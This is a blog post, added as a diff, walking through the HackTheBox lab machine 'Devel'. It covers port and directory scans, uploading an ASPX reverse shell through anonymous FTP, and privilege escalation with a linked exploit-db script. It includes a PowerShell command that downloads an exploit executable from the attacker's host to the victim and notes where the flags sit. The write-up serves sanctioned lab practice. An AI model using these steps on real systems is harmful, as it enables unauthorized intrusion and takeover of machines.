@@ -1,0 +1,112 @@
+---
+layout: post
+title:  "HackTheBox - Devel"
+date:   2021-07-31 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+Running gobuster scan:
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ gobuster dir -u http://10.10.10.5/  -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.5/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/07/31 00:51:54 Starting gobuster in directory enumeration mode
+===============================================================
+/aspnet_client        (Status: 301) [Size: 155] [--> http://10.10.10.5/aspnet_client/]
+```
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ gobuster dir -u http://10.10.10.5/aspnet_client  -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.5/aspnet_client
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/07/31 00:44:27 Starting gobuster in directory enumeration mode
+===============================================================
+/system_web           (Status: 301) [Size: 166] [--> http://10.10.10.5/aspnet_client/system_web/]
+```
+# FOOTHOLD
+
+We can access FTP via anonymous login but there doesn't seem to be anything interesting. However googling about aspnet_client file upload says that scripts can be uploaded in the directory containing aspnet_client directory for validation controls. Also since ASP.NET is enabled we have to upload a .asp/.aspx reverse shell for Windows only.
+
+[aspx reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
+
+Browsing to http://10.10.10.5/reverse.aspx while simultaneously listening via netcat in my terminal gives me a reverse shell.
+
+# PRIVILEGE ESCALATION
+
+So basically , I tried searching for exploits in this list:
+
+[windows privesc](https://www.fuzzysecurity.com/tutorials/16.html)
+
+Searching for the OS build structure shows us an exploitdb script in C language.
+
+[link to script](https://www.exploit-db.com/exploits/40564)
+
+In order to run the file on our windows I made an executable file from the .c file and put it in the same place where we uploaded our reverse shell ( probably should work ).
+
+Here's how to make a windows executable file:
+
+[StackOverFlow link](https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem)
+
+Ugh but it shows up a lot of errors about some undefined reference but googling it tells us we need to add an extra tag (anyone who read the exploit would know about the tag but I didn't read so yea , **TIP OF THE DAY: READ THE EXPLOIT BEFORE EXECUTING**):
+
+```
+-lws2_32
+```
+
+And this time it compiles without errors.
+HOWEVER, it does **NOT** execute. Stubborn Windows throws up some weird error:
+```
+c:\inetpub\wwwroot>40564.exe
+40564.exe
+This program cannot be run in DOS mode.
+```
+Searching for other ways to transfer the file and many frustrated minutes I find out you can transfer files via PowerShell.
+Start a python web server in the directory where the file to be transferred is and execute it in the victim windows machine:
+
+```s
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:3000/40564.exe', 'c:\inetpub\wwwroot\40564.exe')"
+```
+After this i executed the file and ***very fortunately*** finally got root. 
+User flag is in c:\Users\babis\Desktop
+Root flag is in c:\Users\Administrator\Desktop
